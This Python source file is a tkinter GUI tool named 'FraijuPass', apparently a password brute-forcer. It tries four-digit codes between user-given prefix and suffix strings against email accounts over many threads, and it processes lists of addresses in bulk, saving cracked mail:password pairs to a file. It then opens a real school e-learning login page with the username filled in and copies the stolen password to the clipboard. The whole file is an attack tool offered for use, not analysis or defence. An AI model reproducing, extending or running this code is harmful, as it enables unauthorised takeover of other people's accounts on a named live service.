import os
import PassBrute
import time
import webbrowser
import pyperclip
import threading
import tkinter.ttk
from tkinter import *
from tkinter import messagebox
from tkinter import ttk
from tkinter import filedialog

#globals
_trys=0
_done=False
_paused=False
_quit=False

#Functions
def calculateTrys():
	while True:
		global _trys
		prevTrys = _trys
		time.sleep(1)
		trysPerSec = _trys - prevTrys
		lblText = str(trysPerSec) + " (req/s)"
		lblTrysPerSec.config(text=lblText)
		if _done or _quit:
			lblTrysPerSec.config(text="")
			lblTrys.config(text="")
			break

def licenseFunc():
    messagebox.showinfo("License", "This application is an open source product.\n\nHas no Copyright")

def aboutFunc():
    messagebox.showinfo("About", "FraijuPass\nUse it in your own risk\nBy: HackSh00t")

def versionFunc():
	messagebox.showinfo("Version", "Version:\nbeta-a24")

def exitApp():
    exitval=messagebox.askquestion("Exit", "Do you want to exit the application?")

    if exitval=="yes":
        root.destroy()

def PassList(name, startNum):
	global _done
	global _trys
	first=varFirstKey.get()
	second=varLastKey.get()
	mail=varMail.get()
	num=int(startNum)
	passToTry=""

	while num<10000 and _done==False and _trys<10000:
		try:
			if num<10:
				passToTry = first + "000" + str(num) + second
			elif num<100:
				passToTry = first + "00" + str(num) + second
			elif num<1000:
				passToTry = first + "0" + str(num) + second
			else:
				passToTry = first + str(num) + second

			if PassBrute.tryPass(mail, passToTry):
				_done=True
				lblPassword.config(text=passToTry)
				lblTrys.config(text="")
				lblError.config(text="")
				progress["value"] = 0
				break
			else:
				lblTrys.config(text=str(_trys))
				lblError.config(text="")
				progress["value"] = _trys

			if _done:
				lblTrys.config(text="")
				lblError.config(text="")
				progress["value"] = 0

			if _paused:
				while _paused:
					time.sleep(5)
					if _quit:
						break
			
			if _quit:
				break

			num+=1
			_trys+=1
		except:
			lblError.config(text="Connection error...")
			lblTrys.config(text=str(_trys))
			time.sleep(5)
			if _quit:
				break

def getCreds():
	global _done
	global _trys
	
	threading._start_new_thread(calculateTrys, ())

	_done=False
	_trys=0

	lblPassword.config(text="")

	threads=varThreads.get()
	numThread=10000/int(threads)
	startNum=0

	for i in range(threads):
		threadName = "Thread" + str(i)

		if startNum<10000:
			threading._start_new_thread(PassList, (threadName, int(startNum)))
		
		startNum+=numThread
	
	while _done==False:
		root.update()

def setPause():
	global _paused

	if _paused==False:
		_paused=True
		btnPause.config(text="Unpause")
	else:
		_paused=False
		btnPause.config(text="Pause")

def setQuit():
	global _quit

	_quit=True
	
	for i in range(4):
		lblError.config(text="Quitting...")
		root.update()
		_quit=True
		time.sleep(2.5)
		lblError.config(text="Whait...")
		root.update()
		_quit=True
		time.sleep(2.5)
	
	progress["value"] = 0
	lblTrys.config(text="")
	lblError.config(text="")
	_quit=False

def recursiveMode():
	global _done
	global _trys

	#Funcs
	def openFile():
		openFileDialog=filedialog.askopenfilename(initialdir="/", title="Select file to open", filetypes=(("list files","*.list"), ("all files", "*.*")))
		varOpen.set(openFileDialog)

	def saveFile():
		saveFileDialog=filedialog.asksaveasfilename(initialdir="/", title="Select file to save", filetypes=(("list files","*.list"), ("all files", "*.*")))
		varSave.set(saveFileDialog)

	def recursivePassList(name, writeFileName, passEmail, startNum):
		global _done
		global _trys
		mail,passKeys=passEmail.split(":")
		first,second=passKeys.split(";")
		num=int(startNum)
		passToTry=""

		while _trys<10000 and _done==False:
			try:
				if num<10:
					passToTry = first + "000" + str(num) + second
				elif num<100:
					passToTry = first + "00" + str(num) + second
				elif num<1000:
					passToTry = first + "0" + str(num) + second
				else:
					passToTry = first + str(num) + second

				if PassBrute.tryPass(mail, passToTry):
					_done=True
					passToWrite=mail+":"+passToTry+"\n"
					writeFile=open(writeFileName, mode="a")
					writeFile.write(passToWrite)
					break

				num+=1
				_trys+=1
			except:
				time.sleep(5)

		if _trys>=10000 and _done==False:
			_done=True
			unknownToWrite=mail+":"+"????????"+"\n"
			writeFile=open(writeFileName, mode="a")
			writeFile.write(unknownToWrite)

	def fileInterpreter(fileName):
		fileReader=open(fileName, mode="r")
		fileContent=fileReader.read()

		memoryChars=""
		emailList=[]
		for i in fileContent:
			if i == "\n":
				emailList.append(memoryChars)
				memoryChars=""
			else:
				memoryChars+=str(i)

		return emailList

	def startRecursive():
		global _done
		global _trys

		_done=False
		_trys=0
		lblStatus.config(text="Work in progress...", fg="red")
		rootRecursive.update()

		openFileName=varOpen.get()
		writeFileName=varSave.get()
		recursiveThreads=varRecursiveThreads.get()
		numThread=10000 / int(recursiveThreads)
		startNum=0

		emailList=fileInterpreter(openFileName)

		for mail in emailList:
			for i in range(recursiveThreads):
				threadName = "Thread" + str(i)

				if startNum<10000:
					threading._start_new_thread(recursivePassList, (threadName, writeFileName, mail, int(startNum)))

				startNum+=numThread

			while _done==False:
				rootRecursive.update()

			time.sleep(20)

			startNum=0
			_done=False
			_trys=0
		
		lblStatus.config(text="Completed!", fg="green")
		_done=True
		_trys=0

    #MainRecursive configuration
	rootRecursive=Tk()
	rootRecursive.title("Recursive Mode")
	rootRecursive.config(width=400, height=400)
	rootRecursive.resizable(False, False)

	mainRecursiveFrame=Frame(rootRecursive)
	mainRecursiveFrame.pack()
	mainRecursiveFrame.config(width=400, height=400)

	#Vars
	varOpen=StringVar(rootRecursive)
	varSave=StringVar(rootRecursive)

	varRecursiveThreads=IntVar(rootRecursive)
	varRecursiveThreads.set(25)

	#mainRecursiveFrame items
	Label(mainRecursiveFrame, text="Open File: ").grid(row=0, column=0)
	txtOpen=Entry(mainRecursiveFrame)
	txtOpen.config(fg="blue", state="disabled", textvariable=varOpen)
	txtOpen.grid(row=0, column=1)
	Button(mainRecursiveFrame, text="Open", command=openFile).grid(row=0, column=2)

	Label(mainRecursiveFrame, text="Save File: ").grid(row=1, column=0)
	txtSave=Entry(mainRecursiveFrame)
	txtSave.config(fg="blue", state="disabled", textvariable=varSave)
	txtSave.grid(row=1, column=1)
	Button(mainRecursiveFrame, text="Save", command=saveFile).grid(row=1, column=2)

	Label(mainRecursiveFrame, text="Threads: ").grid(row=2, column=0)
	txtRecursiveThreads=Entry(mainRecursiveFrame)
	txtRecursiveThreads.config(fg="blue", justify="center", textvariable=varRecursiveThreads)
	txtRecursiveThreads.grid(row=2, column=1, columnspan=2)

	Button(mainRecursiveFrame, text="START", command=startRecursive).grid(row=3, column=0)

	lblStatus=Label(mainRecursiveFrame)
	lblStatus.config(fg="red")
	lblStatus.grid(row=3, column=1, columnspan=2)

	rootRecursive.mainloop()

def openFile():
	openFileDialog=filedialog.askopenfilename(initialdir="/", title="Select file to open", filetypes=(("list files","*.list"), ("all files", "*.*")))

	fileReader=open(openFileDialog, mode="r")
	fileContent=fileReader.read()

	memoryChars=""
	credList=[]
	for i in fileContent:
		if i == "\n":
			credList.append(memoryChars)
			memoryChars=""
		else:
			memoryChars+=str(i)

	credDic={}
	for i in credList:
		try:
			mail, passwd = i.split(":")
			credDic[mail] = passwd
		except:
			pass

	#Open Frame configuration
	rootOpen=Tk()
	rootOpen.title("Open File")
	rootOpen.config(width=400, height=400)
	rootOpen.resizable(False, False)

	#credTable configuration
	credTable=tkinter.ttk.Treeview(rootOpen)

	credTable["columns"]=("EMAIL", "PASSWORD")
	credTable.column("#0", width=50)
	credTable.column("EMAIL", width=150)
	credTable.column("PASSWORD", width=100)
	credTable.heading("#0", text="ID")
	credTable.heading("EMAIL", text="EMAIL")
	credTable.heading("PASSWORD", text="PASSWORD")

	count=0
	for i in credDic:
		credTable.insert("", count, text=str(count), values=(i, credDic[i]))
		count+=1

	credTable.pack()

	#Code
	while True:
		openCred=list(credTable.selection())
		
		if openCred != []:
			credIndex=credTable.item(openCred[0])['values']
			print(credIndex)
			credTable.selection_remove(openCred[0])

			URL="https://elearning17.hezkuntza.net/015307/login/index.php?username=" + credIndex[0]
			webbrowser.open_new_tab(URL)

			pyperclip.copy(credIndex[1])

		rootOpen.update()
		time.sleep(0.1)

	rootOpen.mainloop()

#Main Frame configuration
root=Tk()
root.title("FraijuPass")
root.config(width=400, height=400)
root.resizable(False, False)

mainFrame=Frame(root)
mainFrame.pack()
mainFrame.config(width=400, height=400)

#Vars
varMail=StringVar(root)
varFirstKey=StringVar(root)
varLastKey=StringVar(root)

varThreads=IntVar(root)
varThreads.set(25)

#Menu bar configuration
MenuBar=Menu(root)
root.config(menu=MenuBar)

FileBar=Menu(MenuBar, tearoff=0)
FileBar.add_command(label="Open", command=openFile)
FileBar.add_command(label="Recursive", command=recursiveMode)
FileBar.add_separator()
FileBar.add_command(label="Exit", command=exitApp)

HelpBar=Menu(MenuBar, tearoff=0)
HelpBar.add_command(label="License", command=licenseFunc)
HelpBar.add_command(label="About", command=aboutFunc)
HelpBar.add_command(label="Version", command=versionFunc)

MenuBar.add_cascade(label="Files", menu=FileBar)
MenuBar.add_cascade(label="Help", menu=HelpBar)

#Main frame items
baseFolder=os.path.dirname(__file__)
imagePath=os.path.join(baseFolder, "Images/Fraiju.png")
Image=PhotoImage(file=imagePath)
Label(mainFrame, image=Image).grid(row=0, column=0, rowspan=2)

Label(mainFrame, text="Threads: ").grid(row=0, column=1)
txtThreads=Entry(mainFrame)
txtThreads.config(fg="blue", justify="center", textvariable=varThreads)
txtThreads.grid(row=0, column=2, columnspan=2)

Label(mainFrame, text="Mail: ").grid(row=1, column=1)
txtMail=Entry(mainFrame)
txtMail.config(fg="green", justify="center", textvariable=varMail)
txtMail.grid(row=1, column=2, columnspan=2)

Label(mainFrame, text="First Keys: ").grid(row=2, column=0)
txtKeyFirst=Entry(mainFrame)
txtKeyFirst.config(fg="blue", justify="center", textvariable=varFirstKey)
txtKeyFirst.grid(row=2, column=1)

Label(mainFrame, text="Last Keys: ").grid(row=2, column=2)
txtKeyLast=Entry(mainFrame)
txtKeyLast.config(fg="blue", justify="center", textvariable=varLastKey)
txtKeyLast.grid(row=2, column=3)

progress = ttk.Progressbar(mainFrame, orient='horizontal', length=300, mode='determinate')
progress.grid(row=3, column=0, columnspan=3)
progress["maximum"] = 10000
progress["value"] = 0

lblTrys=Label(mainFrame)
lblTrys.config(fg="blue")
lblTrys.grid(row=3, column=3, sticky="W")

lblTrysPerSec=Label(mainFrame)
lblTrysPerSec.config(fg="blue")
lblTrysPerSec.grid(row=3, column=3, sticky="E")

Button(mainFrame, text="START", command=getCreds).grid(row=4, column=0, sticky="W")

btnPause = Button(mainFrame)
btnPause.config(text="Pause", command=setPause)
btnPause.grid(row=4, column=1, sticky="W")

Button(mainFrame, text="Quit", command=setQuit).grid(row=4, column=1, sticky="E", padx=30)

lblPassword=Label(mainFrame)
lblPassword.config(fg="green")
lblPassword.grid(row=4, column=2)

lblError=Label(mainFrame)
lblError.config(fg="red")
lblError.grid(row=4, column=3)

root.mainloop()
